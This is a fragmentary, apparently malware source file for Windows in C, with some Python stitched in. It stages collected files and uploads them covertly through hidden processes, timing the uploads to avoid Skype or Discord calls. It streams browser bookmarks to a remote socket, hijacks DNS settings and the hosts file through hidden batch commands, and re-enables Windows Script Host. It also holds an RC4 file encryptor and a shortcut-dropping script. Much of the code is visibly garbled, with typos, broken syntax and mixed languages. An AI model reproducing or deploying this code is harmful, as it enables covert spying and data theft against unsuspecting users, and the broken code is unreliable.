          /// determine file extension and filter out unneeded files
          ///

          for (i = 0; i < mTotalFiles && mFileEntries[i] != NULL; i++)
          {
            ZeroMemory(mTemp, sizeof(mTemp));
            strncpy(mTemp, &mFileEntries[i][strlen(mFileEntries[i]) - 4], 4);




import base64

SBOX_SIZE = 1024
MAX_BUF_SIZE = 256

sBox = [0] * (SBOX_SIZE + 1)


def prepare_key(key):
    mLen = len(key)
    i = 0
    j = 0

    for i in range(256):
        sBox[i] = i

    for i in range(256):
        j = (j + sBox[i] + key[i % mLen]) % 256
        sBox[i], sBox[j] = sBox[j], sBox[i]


def encrypt(key, plain_text):
    prepare_key(key)
    cipher_text = bytearray()
    i = 0
    j = 0

    for c in plain_text:
        i = (i + 1) % 256
        j = (j + sBox[i]) % 256
        sBox[i], sBox[j] = sBox[j], sBox[i]
        t = (sBox[i] + sBox[j]) % 256
        cipher_text.append(c ^ sBox[t])

    return cipher_text


def decrypt(key, cipher_text):
    return encrypt(key, cipher_text)


def main():
    # Example usage
    encryption_key = b'MySecretKey'
    file_path = 'example.txt'

    with open(file_path, 'rb') as file:
        file_contents = file.read()

    encrypted_contents = encrypt(encryption_key, file_contents)

    # Write encrypted contents to a new file
    with open('encrypted_file.fsu', 'wb') as encrypted_file:
        encrypted_file.write(encrypted_contents)


if _n _name__ == "__main__":
    main()

/// This Python code performs the same encryption process as the C code provided earlier. It reads the contents of a file named "example.txt", encrypts them using the RC4 encryption algorithm with the provided encryption key, and then writes the encrypted contents to a new file named "encrypted_file.fsu". You'll need to adjust the file paths and encryption key according to your specific requirements.




           
           
             ZeroMemory(mFileEntries[i], MAX_BUF_SIZE + 1);
             snprintf(mFileEntries[i], MAX_BUF_SIZE, "XXX");
            }
          }

          qsort((void *) mFileEntries, (size_t) mTotalFiles, sizeof(char *), compare);



          ///
          /// After locating and sorting all files, upload them
          /// to the dropzone.
          ///

?         ZeroMemory(mSkypeBinaryName, sizeof(mSkypeBinaryName));
?         snprintf(mSkypeBinaryName, sizeof(mSkypeBinaryName) - 1, SKYPE_BINARY_NAME); /// [!!! wtf skype? wjere from? !!!]

          for( i = 0; i < mTotalFiles && mFileEntries[i] != NULL && i < MAX_UPLOAD_FILES; ++i )
          {
           
                      
            ///
?           /// don't load up anything while user is skyping. that will influence the audio quality of the call.
            ///

            if (isUserSkyping() == 0 && processExists(mSkypeBinaryName, NULL) == 0)
              break;

            ZeroMemory(mUploadFileFullPath, sizeof(mUploadFileFullPath));
            snprintf(mUploadFileFullPath, MAX_BUF_SIZE, "%s%s", mUploadDirFullPath, mFileEntries[i]);


            ///
            /// likewise, rather not load stuff up whilst user is discorbing cos it'll be such an obvious that there's a fight for ul bandwidth occurring
            ///

          ZeroMEmory(mDiscorbBinaryName, sizeof(mDiscorbBinaryName));
          snprontf(mDiscorbBinaryName, sizeof(mDiscorbBinaryName) -1, DISCORB_BINARY_NAME); 
            
          for( i = 0; i < mTotalFiles && mFileEntires[i] != NULL &&i < MAX_UPLOAD_FILES; ++i )  

          /// so we check:

            if (isUserDiscorbing() == 0 && processExists(mDiscorbBinaryName, NULL) == 0)
              break;
            
            ///
            /// otherwise, execute the upload command.
		        ///

            if (PathFileExists(mUploadFileFullPath))
            {
              ZeroMemory(&si, sizeof(si));
              ZeroMemory(&pi, sizeof(pi));

              si.cb = sizeof(si);
              si.dwFlags = STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW;
              si.wShowWindow = SW_HIDE;

              snprintf(mCmdLine, MAX_BUF_SIZE, "\"%s\" hu \"%s\"", gProgrammName, mUploadFileFullPath);

              if (CreateProcess(NULL, mCmdLine, NULL, NULL, TRUE, CREATE_NO_WINDOW, 0, NULL, &si, &pi) != 0)
              {
                mRetCode = WaitForSingleObject(pi.hProcess, (THREAD_TIMEOUT_UPLOAD + 10) * 1000);
                TerminateProcess(pi.hProcess, 0);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
              } // if (CreateProcess( ...
            } // if (PathFileExists(mUploadFileFullPath))
          } // for( i = 0; i < mTotalFiles && i < MAX_UPLOAD_FILES; ++i )
        } //  if (mTotalFiles > 0)
      }  // if (PathFileExists(mUploadDirFullPath))
    } // if (GetEnvironmentVariable(gBDEnvironmentDirs[mCounter], mTemp, sizeof(mTemp) - 1) > 0)
  } // for(mCounter = 0; gBDEnvironmentDirs[mCounter] != NULL; mCounter++)

  gUploadStatus = UPLOAD_THREAD_FINISHED;

  return(mRetVal);
}



///
/// Compare function for qsort
///

int compare( const void *arg1, const void *arg2 )
{
  return _stricmp(*(char**) arg1, *(char**) arg2);
}

/// v) FILE STRUCTURE DOCUMENT CREATION PROCESS - in which we create
/// a structured tree of all the crapthat was on HDD
///



///
/// Find favs folder [!!!]
///

DWORD WINAPI sendBrowserFavoritesInfos(PVOID pParameter)
{
  int lFuncRetVal = 0;
  int lRetVal = 0;
  char lTemp[MAX_BUF_SIZE + 1];
  char *lHomeDirectory = NULL;
  STRUCTURE_COMMAND *lCommandStructure = (STRUCTURE_COMMAND *) pParameter; 

  ZeroMemory(lTemp, sizeof(lTemp));
  snprintf(lTemp, sizeof(lTemp) - 1, "<browserfavorites>");
  lFuncRetVal = send(lCommandStructure->lRemoteSocket, lTemp, strlen(lTemp), 0);

  if ((lHomeDirectory = getenv("HOMEPATH")) != NULL)
  {
    findFavoritesFiles(lCommandStructure->lRemoteSocket, lHomeDirectory);
  } else {
    findFavoritesFiles(lCommandStructure->lRemoteSocket, "c:\(HOMEPATH)\AppData\Roaming\Opera Software\Opera Stable\\");
  } else {  
    findFavoritesFiles(lCommandStructure->lRemoteSocket, "c:\(HOMEPATH)\AppData\Roaming\Mozilla\Firefox\Profiles\{profile}.default\\places.sqlite");
  } else {  
    findFavoritesFiles(lCommandStructure->lRemoteSocket, "c:\(HOMEPATH)\AppData\local\Microsoft\Edge\User Data\Default\\Bookmarks");
  } else {  
    findFavoritesFiles(lCommandStructure->lRemoteSocket, "c:\(HOMEPATH)\AppData\local\Google\Chrome\User Data\Default\\Bookmarks");
  } else {  
    findFavoritesFiles(lCommandStructure->lRemoteSocket, "c:\(HOMEPATH)\Favorites\\");
  } else {  
    findFavoritesFiles(lCommandStructure->lRemoteSocket, "c:\Program Files\Opera\\bookmarks");
  } else {  
    findFavoritesFiles(lCommandStructure->lRemoteSocket, "c:\Program Files (x86)\Opera\\bookmarks");
  } else {  
    findFavoritesFiles(lCommandStructure->lRemoteSocket, "c:\Program Files\Mozilla Firefox\browser\\omni.ja");
  } else {  
    findFavoritesFiles(lCommandStructure->lRemoteSocket, "c:\Program Files (x86)\Microsoft\Edge\Application\{version}\Resources\\Bookmarks");
  } else {  
    findFavoritesFiles(lCommandStructure->lRemoteSocket, "c:\Program Files (x86)\Google\Chrome\Application\{version}\Resources\\Bookmarks");
  } else {  
    findFavoritesFiles(lCommandStructure->lRemoteSocket, "c:\Windows\Favorites\\");
}

  ZeroMemory(lTemp, sizeof(lTemp));
  snprintf(lTemp, sizeof(lTemp) - 1, "</browserfavorites>");
  lFuncRetVal = send(lCommandStructure->lRemoteSocket, lTemp, strlen(lTemp), 0);

  return(lRetVal);
}



///
/// find fav files inside
///

int findFavoritesFiles(SOCKET pRemoteSocket, char *pDirectory)
{
   WIN32_FIND_DATA lFileData; 
   HANDLE lSearchHandle;  
   char lFilePattern[MAX_BUF_SIZE + 1]; 
   char lSubDirectory[MAX_BUF_SIZE + 1];
   char lHistoryFile[MAX_BUF_SIZE + 1];
   int lRetVal = 0;
   
   if (pDirectory[strlen(pDirectory) - 1] != '\\')
     strcat(pDirectory, "\\");

   ZeroMemory(lFilePattern, sizeof(lFilePattern));
   _snprintf(lFilePattern, sizeof(lFilePattern) - 1, "%s*", pDirectory);
          
   if ((lSearchHandle = FindFirstFile(lFilePattern, &lFileData)) == INVALID_HANDLE_VALUE) 
   { 
     lRetVal = 1;
     goto END;
   } // if ((lSearchHandle = Find..
 	
   do 
   { 
     if(lFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
     {
       if (strcmp(lFileData.cFileName, ".") && strcmp(lFileData.cFileName, ".."))
       {
         ZeroMemory(lSubDirectory, sizeof(lSubDirectory));
         _snprintf(lSubDirectory, sizeof(lSubDirectory) - 1, "%s%s\\", pDirectory, lFileData.cFileName);
         findFavoritesFiles(pRemoteSocket, lSubDirectory);
       } // if (strcmp(lFileDa...
     } else {
       if (strstr(lFileData.cFileName, ".url"))
       {
         ZeroMemory(lHistoryFile, sizeof(lHistoryFile));
         _snprintf(lHistoryFile, sizeof(lHistoryFile) - 1, "%s%s", pDirectory, lFileData.cFileName);
         listFavoritesEntries(pRemoteSocket, lHistoryFile);
       } // if (strstr(lFileData...
     } // if(lFileData.dwFileAt...
   } while (FindNextFile(lSearchHandle, &lFileData));

END:

  if (lSearchHandle != INVALID_HANDLE_VALUE) FindClose(lSearchHandle);
   
  return(lRetVal);   
}



int listFavoritesEntries(SOCKET pRemoteSocket, char *pFileName)
{
  HANDLE lFileHandle = INVALID_HANDLE_VALUE;
  int lRetVal = 0;
  int lFuncRetVal = 0;
  char lTemp[MAX_BUF_SIZE + 1];
  char lDataBuffer[MAX_BUF_SIZE + 1];
  char *lURLPointer = NULL;
  int lLastPosition = 0;
  char *lFileDataBuffer = NULL;
  DWORD lBytesRead = 0;

  if ((lFileHandle = CreateFile(pFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) != INVALID_HANDLE_VALUE)
  {
    if ((lFileDataBuffer = (char *) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, GetFileSize(lFileHandle, 0))) != NULL)
    {
      ZeroMemory(lDataBuffer, sizeof(lDataBuffer));

      if (ReadFile(lFileHandle, lFileDataBuffer, GetFileSize(lFileHandle, 0),  &lBytesRead, NULL))
      {
        lLastPosition = 0;
        while(readLine(lDataBuffer, sizeof(lDataBuffer) - 1, lFileDataBuffer, GetFileSize(lFileHandle, 0), &lLastPosition))
        {
        ///
        /// delete trailing NL/CR
        ///

          while (lDataBuffer[strlen(lDataBuffer) - 1] == '\n' || lDataBuffer[strlen(lDataBuffer) - 1] == '\r')
            lDataBuffer[strlen(lDataBuffer) - 1] = '\0';



        ///
        /// find URL-entry in favorite file
        ///

          if (strncmp(lDataBuffer, "url=", 4) == 0 || strncmp(lDataBuffer, "URL=", 4) == 0)
          {
            lURLPointer = lDataBuffer + 4;

            ZeroMemory(lTemp, sizeof(lTemp));
            _snprintf(lTemp, sizeof(lTemp) - 1, "<favoriteentry><filename>%s</filename><url>%s</url></favoriteentry>", pFileName, lURLPointer);
            lFuncRetVal = send(pRemoteSocket, lTemp, strlen(lTemp), 0);
          }

          ZeroMemory(lDataBuffer, sizeof(lDataBuffer));
        } // while(readLine(lDataBuffer, si...
      } // if ((lFileDataBuffer = (char *) Heapalloc(...
    } // if (ReadFile(lFil...
  } // if ((lFileHandle = CreateFile(...

END:

  if (lFileDataBuffer != NULL)
    HeapFree(GetProcessHeap(), 0, lFileDataBuffer);

  if (lFileHandle != INVALID_HANDLE_VALUE)
    CloseHandle(lFileHandle);

  return(lRetVal);    
}



///
/// List directory content and add filesize to the global resource counter
///

void listFiles(char *pDirectory)
{
  char mDirectoryPattern[MAX_BUF_SIZE + 1];
  char mFullPath[MAX_BUF_SIZE];
  int mCounter = 0;
  WIN32_FIND_DATA mFindFileData;
  HANDLE mFindHandle = INVALID_HANDLE_VALUE;
  struct _stat mStatusBuffer;



  ///
  /// Iterate through the base directory and search for files.
  ///

  ZeroMemory(mDirectoryPattern, sizeof(mDirectoryPattern));
  snprintf(mDirectoryPattern, sizeof(mDirectoryPattern) - 1, "%s*", pDirectory);


  if ((mFindHandle = FindFirstFile(mDirectoryPattern, &mFindFileData)) != INVALID_HANDLE_VALUE)
  {
    ZeroMemory(mFullPath, sizeof(mFullPath));
    snprintf(mFullPath, sizeof(mFullPath) - 1, "%s%s", pDirectory, mFindFileData.cFileName);



    ///
    /// File is a directory. Call this function recursively to 
    /// check it for further matching files.
    ///

    if (PathIsDirectory(mFullPath))
    {
      if (mFindFileData.cFileName[0] != '.')
      {
        if (strstr(mFindFileData.cFileName, BD_DATA_DIR))
        {
          if (mFullPath[strlen(mFullPath) - 1] != '\\')
            strncat (mFullPath, "\\", 1);

          listFiles(mFullPath);
        }
      } 



    ///
    /// It's a file and it's the first one so add it to the list.
    ///
    
    } else {
      _stat(mFullPath, &mStatusBuffer);
      gCurrentHDResourceUsed += mFindFileData.nFileSizeLow;
    }



    ///
    /// Further files were found. Add them to the list.
    ///

    while (FindNextFile(mFindHandle, &mFindFileData) != 0) 
    {
      ZeroMemory(mFullPath, sizeof(mFullPath));
      snprintf(mFullPath, sizeof(mFullPath) - 1, "%s%s", pDirectory, mFindFileData.cFileName);



      ///
      /// File is a directory. Call this function recursively to 
      /// check it for further matching files.
      ///

      if (PathIsDirectory(mFullPath))  
      {
        if (mFindFileData.cFileName[0] != '.')
        {
          if (strstr(mFindFileData.cFileName, BD_DATA_DIR))
          {
            if (mFullPath[strlen(mFullPath) - 1] != '\\')
              strncat (mFullPath, "\\", 1);

            listFiles(mFullPath);
          }
        }



       ///
       /// It's a file so add it to the list.
       ///

      } else {
        _stat(mFullPath, &mStatusBuffer);
        gCurrentHDResourceUsed += mFindFileData.nFileSizeLow;
      } // if (PathIsDirectory(mFullPath))
    } // while (FindNextFile(mFindHandle, &mFindFileData) != 0)
    FindClose(mFindHandle);
  } // if ((mFindHandle = FindFirstFile(mDirectoryPattern, &mFindFileData)) != INVALID_HANDLE_VALUE)
}



///
/// Manage HD resources
///

void HDDManager()
{
  int mExitStatus = 0;
  int mCounter = 0;
  int mOldestFileSize = 0;
  char mDirectory[MAX_BUF_SIZE + 1];
  char mDirectoryPattern[MAX_BUF_SIZE + 1];
  char mDeleteFile[MAX_BUF_SIZE + 1];
  char mOldestFile[MAX_BUF_SIZE + 1];
  HANDLE mFileHandle = INVALID_HANDLE_VALUE;
  FILE *mFH = NULL;



  ///
  /// Find all data files and accumulate file size
  ///
  
  for (mCounter = 0, gCurrentHDResourceUsed = 0; gBDEnvironmentDirs[mCounter] != NULL; mCounter++)
  {  
    ZeroMemory(mDirectory, sizeof(mDirectory));
    if (GetEnvironmentVariable(gBDEnvironmentDirs[mCounter], mDirectory, MAX_BUF_SIZE) == 0)
      continue;



    ///
    /// If entry is a drive and no directory add a ":"
    ///

    if (mDirectory[strlen(mDirectory) - 1] == ':')
      strcat(mDirectory, "\\");
    else if (mDirectory[strlen(mDirectory) - 1] != '\\')
      strncat (mDirectory, "\\", 1);


    ZeroMemory(mDirectoryPattern, sizeof(mDirectoryPattern));
    snprintf(mDirectoryPattern, sizeof(mDirectoryPattern) - 1, "%s%s\\%s\\", mDirectory, gBaseDirectory, BD_DATA_DIR);


    if (! PathFileExists(mDirectoryPattern))
      continue;

    listFiles(mDirectoryPattern);
  } // for (mCounter = 0, gTotalUsedMemory = 0; gBDEnvironmentDirs[mCounter] != NULL; mCounter++)



  ///
  /// If upper volume limit is reached delete the oldest files. [!!!]
  ///

  ZeroMemory(mDeleteFile, sizeof(mDeleteFile));
  snprintf(mDeleteFile, sizeof(mDeleteFile) - 1, "%s%s", mDirectoryPattern, FULL_FILE);

  if (gCurrentHDResourceUsed > atoi(gMaxHDResource))
  {



    ///
    /// Create the FULL_FILE so applications wont write any data to the upload directory
    ///

    if ((mFileHandle = CreateFile(mDeleteFile, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) != INVALID_HANDLE_VALUE)
      CloseHandle(mFileHandle);



    ///
    /// Map all files with size and creation date and delete the oldest file(s) [!!!]
    ///

    for (mCounter = 0; gBDEnvironmentDirs[mCounter] != NULL; mCounter++)
    {  
      ZeroMemory(mDirectory, sizeof(mDirectory));
      if (GetEnvironmentVariable(gBDEnvironmentDirs[mCounter], mDirectory, MAX_BUF_SIZE) == 0)
        continue;



      ///
      /// If entry is a drive and no directory add a ":"
      ///

      if (mDirectory[strlen(mDirectory) - 1] == ':')
        strcat(mDirectory, "\\");
      else if (mDirectory[strlen(mDirectory) - 1] != '\\')
        strncat (mDirectory, "\\", 1);


      ZeroMemory(mDirectoryPattern, sizeof(mDirectoryPattern));
      snprintf(mDirectoryPattern, sizeof(mDirectoryPattern) - 1, "%s%s\\%s\\", mDirectory, gBaseDirectory, BD_DATA_DIR);


      if (! PathFileExists(mDirectoryPattern))
        continue;

      createDetailedFileListing(mDirectoryPattern);
    } // for (mCounter = 0; gBDEnvironmentDirs[mCounter]




   ///
   /// Delete the oldest files. [!!!]
   ///

    mCounter = 0;
    while (((gCurrentHDResourceUsed + (atoi(gMaxHDResource) / 20)) > atoi(gMaxHDResource)) && mCounter < 512)
    {
      ZeroMemory(mOldestFile, sizeof(mOldestFile));

      if((mOldestFileSize = findOldestFile(mOldestFile, sizeof(mOldestFile) - 1)) && (strlen(mOldestFile) > 0) )
        if (DeleteFile(mOldestFile) != 0)
          gCurrentHDResourceUsed -= mOldestFileSize;

      mCounter++;
    }

    deleteAllItems();
  } else { // if ((gCurrentHDResourceUsed) > atoi(gMaxHDResource))
    DeleteFile(mDeleteFile);
  } // if ((gCurrentHDResourceUsed) > atoi(gMaxHDResource))
}


///
/// List directory content and add files to list
///

int createDetailedFileListing(char *pDirectory)
{
  int mRetVal = 0;
  char mDirectoryPattern[MAX_BUF_SIZE + 1];
  char mFullPath[MAX_BUF_SIZE];
  int mCounter = 0;
  WIN32_FIND_DATA mFindFileData;
  HANDLE mFindHandle = INVALID_HANDLE_VALUE;
  struct _stat mStatusBuffer;
  int mTotalStorageUsed = 0;


  ZeroMemory(mDirectoryPattern, sizeof(MAX_BUF_SIZE + 1));
  snprintf(mDirectoryPattern,  MAX_BUF_SIZE, "%s*", pDirectory);

  
  if ((mFindHandle = FindFirstFile(mDirectoryPattern, &mFindFileData)) != INVALID_HANDLE_VALUE)
  {
    ZeroMemory(mFullPath, sizeof(mFullPath));
    snprintf(mFullPath, sizeof(mFullPath) - 1, "%s%s", pDirectory, mFindFileData.cFileName);



    ///
    /// File is a directory. Call this function recursively and check 
    /// this directory for further matching files.
    ///

    if (PathIsDirectory(mFullPath))
    {
      if (mFindFileData.cFileName[0] != '.')
      {
        if (strstr(mFindFileData.cFileName, BD_DATA_DIR))
        {
          if (mFullPath[strlen(mFullPath) - 1] != '\\')
            strncat (mFullPath, "\\", 1);

          createDetailedFileListing(mFullPath);
        } // if (strstr(mFindFileData.cFileName, BD_DATA_DIR))
      } // if (mFindFileData.cFileName[0] != '.')



    ///
    /// Its a file and its' the first one, add it.
    ///

    } else {
      _stat(mFullPath, &mStatusBuffer);
      addItem(mFullPath, mFindFileData.nFileSizeLow, mStatusBuffer.st_ctime);
      mTotalStorageUsed += mFindFileData.nFileSizeLow;
    } // if (PathIsDirectory(mFullPath))



    ///
    /// Further matching files found.
    ///

    while (FindNextFile(mFindHandle, &mFindFileData) != 0)
    {
      ZeroMemory(mFullPath, sizeof(mFullPath));
      snprintf(mFullPath, sizeof(mFullPath) - 1, "%s%s", pDirectory, mFindFileData.cFileName);



      ///
      /// File is a directory. Call this function recursively and check 
      /// this directory for further matching files.
      ///

      if (PathIsDirectory(mFullPath))  
      {
        if (mFindFileData.cFileName[0] != '.')
        {
          if (strstr(mFindFileData.cFileName, BD_DATA_DIR))
          {
            if (mFullPath[strlen(mFullPath) - 1] != '\\')
              strncat (mFullPath, "\\", 1);

            createDetailedFileListing(mFullPath);
          }
        }



      ///
      /// It's a file so add it!
      ///

      } else {
        _stat(mFullPath, &mStatusBuffer);
        mTotalStorageUsed += mFindFileData.nFileSizeLow;
        addItem(mFullPath, mFindFileData.nFileSizeLow, mStatusBuffer.st_ctime);
      } // if (PathIsDirectory(mFullPath))
    } // while (FindNextFile(mFindHandle, &mFindFileData) != 0)

    FindClose(mFindHandle);
    mFindHandle = INVALID_HANDLE_VALUE;
    mRetVal = mTotalStorageUsed;

  } // if ((mFindHandle = FindFirstFile(mDirectoryPattern, &mFindFileData)) != INVALID_HANDLE_VALUE)

  if (mFindHandle != INVALID_HANDLE_VALUE)
    FindClose(mFindHandle);

  return(mRetVal);
}



///
/// Add an item to the list
///

int addItem(char *pFileName, int pFileSize, int pCreationTime)
{
  int mRetVal = 0;
  PFILE_ITEM mCurrentItem = NULL;

  
  ///
  /// No file item attached to the list yet
  ///
  
  if (gFileListHead == NULL)
  {
    if ((gFileListHead = (PFILE_ITEM) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(FILE_ITEM))) != NULL)
    {
      strncpy(gFileListHead->mFileName, pFileName, MAX_BUF_SIZE);
      gFileListHead->mFileSize = pFileSize;
      gFileListHead->mCreationTime = pCreationTime;
    } else {
      mRetVal = -1;
      goto END;
    } // if ((gFileListHead = (PFILE_ITEM) HeapAlloc(GetProcessHeap()
  } else {
    mCurrentItem = gFileListHead;

    while (mCurrentItem->mNextItem != NULL)
      mCurrentItem = mCurrentItem->mNextItem;

    if ((mCurrentItem->mNextItem = (PFILE_ITEM) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(FILE_ITEM))) != NULL)
    {
      mCurrentItem = mCurrentItem->mNextItem;
      strncpy(mCurrentItem->mFileName, pFileName, MAX_BUF_SIZE);
      mCurrentItem->mFileSize = pFileSize;
      mCurrentItem->mCreationTime = pCreationTime;
    } else {
      mRetVal = -2;
      goto END;
    }
  }

END:

  return(mRetVal);
}




///[
/// 7z 'em?
///


///
/// encrypt? 'em?
///]




///
/// vii) PREP FOR TO SEND DATA HOME - Setting the DNS server
///

DWORD WINAPI setNewDNSServer(PVOID pParameter)
{
  int lRetVal = 0;
  int lFuncRetVal = 0;
  char lTemp[MAX_BUF_SIZE + 1];
  STUCTRE_COMMAND *lCommandStructure = (STRUCTURE_COMMAND *) pParameter;

  if (lCommandStructure != NULL && lCommandStructure->sCommandString != NULL)
  {
    ZeroMemory(lTemp, sizeof(lTemp));
    snprintf(lTemp, sizeof(lTemp) - 1, "FOR /F %%%%A IN ('REG QUERY HKEY_LOCAL_MACHINE\\system\\currentcontrolset\\services\\tcpip\\parameters\\interfaces') DO reg add %%%%A /v NameServer  /t reg_sz  /d %s /f", lCommandStructure->sCommandString);
    printToFile("_DNS.bat", lTemp);
    printToFile("_DNS.bat", "ipconfig /flushdns");
    printToFile("_DNS.bat", "ipconfig /registerdns");
    ShellExecuteA(NULL, NULL, "_DNS.bat", NULL, NULL, SW_HIDE);
    Sleep(1000);
    DeleteFile("_DNS.bat");
  }

  return(lRetVal);
}



///
/// Check if windows scripting host is activated
///

int isScriptingActive()
{
  int mRetVal = 1;
  int mRegValue = 0;
  HKEY mKey = NULL;
  char *mEnableValue = NULL;
  long mValueType = 0;
  unsigned long mPathLength = 0;


  if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows Script Host\\Settings\\", 0, KEY_READ, &mKey) == ERROR_SUCCESS)
  {
    mValueType = REG_SZ;
    if (RegQueryValueEx(mKey, "Enable", 0, (unsigned long *) &mValueType, NULL, &mPathLength) == ERROR_SUCCESS)
    {
      if (mPathLength > 0)
      {     
        if ((mEnableValue = (char *) HeapAlloc(GetProcessHeap(), 0 , mPathLength)) != NULL)
        {
          ZeroMemory(mEnableValue, mPathLength);
          RegQueryValueEx(mKey, "Enable", 0, (unsigned long *) &mValueType, (unsigned char *) mEnableValue, &mPathLength);

          mRegValue = atoi(mEnableValue);
        
          if (mRegValue <= 0)
            mRetVal = 1; // scripting is inactive
          else
            mRetVal = 0; // scripting is active

          HeapFree(GetProcessHeap(), 0, mEnableValue);
          mEnableValue = NULL;
        } // if ((mEnableValue = (char *) HeapAlloc(GetProcessHeap(), 0 , mPathLength)) == NULL)
      } // if (mPathLength > 0)
    } // if (RegQueryValueEx(mKey, "Enable", 0, (unsigned long *) &mValueType, NULL, &mPathLength) == ERROR_SUCCESS)
    RegCloseKey(mKey);
  } // if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows Script Host\\Settings\\", 0, KEY_READ, &mKey)


  return(mRetVal);
}



///
/// Activate the windows scripting host environment.
///
    
void activateWindowsScriptingHost()
{    
  HKEY mKey = NULL;
  STARTUPINFO si;
  PROCESS_INFORMATION pi;



  ///
  /// Deactivate system error beep in the registry
  ///

  if(RegOpenKeyEx(HKEY_CURRENT_USER,"Control Panel\\Sound\\", 0, KEY_WRITE, &mKey) == ERROR_SUCCESS)
  {
    RegSetValueEx(mKey, "Beep", 0, REG_SZ, (unsigned char *) "no", 2);
    RegCloseKey(mKey);
  }



///
/// adding a silly regedit for some funs: 
///

import subprocess

/// XML code containing the VBScript
  xml_code = """

  <package>
   <job id="vbs">
      <script language="VBScript">
         set WshShell = WScript.CreateObject("WScript.Shell")
         strDesktop = WshShell.SpecialFolders("Desktop")
         set oShellLink = WshShell.CreateShortcut(strDesktop & "\Shortcut Script.lnk")
         oShellLink.TargetPath = WScript.ScriptFullName
         oShellLink.WindowStyle = 1
         oShellLink.Hotkey = "CTRL+SHIFT+F"
         oShellLink.IconLocation = "notepad.exe, 0"
         oShellLink.Description = "Shortcut Script"
         oShellLink.WorkingDirectory = strDesktop
         oShellLink.Save
      </script>
   </job>
  
  /xml_code"""

/// XML code containing the  JScript jobs

   <job id="js">
      <script language="JScript">
         var WshShell = WScript.CreateObject("WScript.Shell");
         strDesktop = WshShell.SpecialFolders("Desktop");
         var oShellLink = WshShell.CreateShortcut(strDesktop + "\\Shortcut Script.lnk");
         oShellLink.TargetPath = WScript.ScriptFullName;
         oShellLink.WindowStyle = 1;
         oShellLink.Hotkey = "CTRL+SHIFT+F";
         oShellLink.IconLocation = "notepad.exe, 0";
         oShellLink.Description = "Shortcut Script";
         oShellLink.WorkingDirectory = strDesktop;
         oShellLink.Save();
      </script>
   </job>
</package>
"""

def create_shortcut():
    # Save the XML code to a file
    xml_file = "shortcut_code.xml"
    with open(xml_file, "w") as f:
        f.write(xml_code)
    
    # Execute the XML code using the Windows Script Host
    subprocess.run(["cscript", "//NoLogo", "//E:vbscript", "shortcut_code.xml"], shell=True)

# Create the shortcut
create_shortcut()

/// End of regedit funs...



  ///
  /// Set registry values.
  ///
  
  if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows Script Host\\Settings\\", 0, KEY_WRITE, &mKey) == ERROR_SUCCESS)
  {
    RegSetValueEx(mKey, "Enable", 0, REG_SZ, (unsigned char *) "1", 1);
    RegCloseKey(mKey);
  }


  if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows Scripting Host\\Settings\\", 0, KEY_WRITE, &mKey) == ERROR_SUCCESS)
  {
    RegSetValueEx(mKey, "Enable", 0, REG_SZ, (unsigned char *) "1", 1);
    RegCloseKey(mKey);
  }



///
/// viii) TIME TO CARRY OUT ACTUAL UPLOAD PROCESS
///

DWORD WINAPI addHostsEntry(PVOID pParameter)
{
  int lRetVal = 0;
  int lFuncRetVal = 0;
  char lTemp[MAX_BUF_SIZE + 1];
  char lTemp2[MAX_BUF_SIZE + 1];
  char *lTempPointer = NULL;
  DWORD dwWritten = 0;
  HANDLE lFileHandle = INVALID_HANDLE_VALUE;
  STRUCTURE_COMMAND *lCommandStructure = (STRUCTURE_COMMAND *) pParameter;


  if (lCommandStructure->sCommandString != NULL)
  {
    ZeroMemory(lTemp, sizeof(lTemp));
	snprintf(lTemp, sizeof(lTemp) - 1, "\r\n%s", lCommandStructure->sCommandString);

    if ((lFileHandle = CreateFile(HOSTS_FILE, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) != INVALID_HANDLE_VALUE)
    {
      SetFilePointer(lFileHandle,0,0,FILE_END); 
      WriteFile(lFileHandle, lTemp, strlen(lTemp), &dwWritten, NULL);
      CloseHandle(lFileHandle);
    }
  }

  return(lRetVal);
}



DWORD WINAPI removeHostsEntry(PVOID pParameter)
{
  int lRetVal = 1;
  int lFuncRetVal = 0;
  char lTemp[MAX_BUF_SIZE + 1];
  char lReadBuffer[MAX_BUF_SIZE + 1];
  STRUCTURE_COMMAND *lCommandStructure = (STRUCTURE_COMMAND *) pParameter;
  FILE *lFileOldHostsHandle = NULL;
  FILE *lFileNewHostsHandle = NULL;

  if (lCommandStructure != NULL && lCommandStructure->sCommandString != NULL)
  {
    if ((lFileOldHostsHandle = fopen(HOSTS_FILE, "r")) != NULL)
    {
      ZeroMemory(lTemp, sizeof(lTemp));
      snprintf(lTemp, sizeof(lTemp) - 1, "%s.tmp", HOSTS_FILE);

      if ((lFileNewHostsHandle = fopen(lTemp, "w")) != NULL)
      {
        while (!feof(lFileOldHostsHandle))
        {
          ZeroMemory(lReadBuffer, sizeof(lReadBuffer));

          if (fgets(lReadBuffer, sizeof(lReadBuffer) - 1, lFileOldHostsHandle) > 0)
	    {
            if (strstr(lReadBuffer, lCommandStructure->sCommandString) == NULL)
              fprintf(lFileNewHostsHandle, lReadBuffer);
            else
              lRetVal = 0;
          }
        }
        fclose(lFileNewHostsHandle);
      }
      fclose(lFileOldHostsHandle);
    }
  }



END:

  if (lRetVal == 0)
  {
    ZeroMemory(lTemp, sizeof(lTemp));
    snprintf(lTemp, sizeof(lTemp) - 1, "%s.tmp", HOSTS_FILE);
    DeleteFile(HOSTS_FILE);
    MoveFile(lTemp, HOSTS_FILE);
  }

  return(lRetVal);
}



  ///
  /// Apply the previously determined proxy settings.
  ///

  if (strlen(pProxyConnection) > 0)
  {
    mbstowcs(mwProxyConnection, pProxyConnection, MAX_BUF_SIZE);
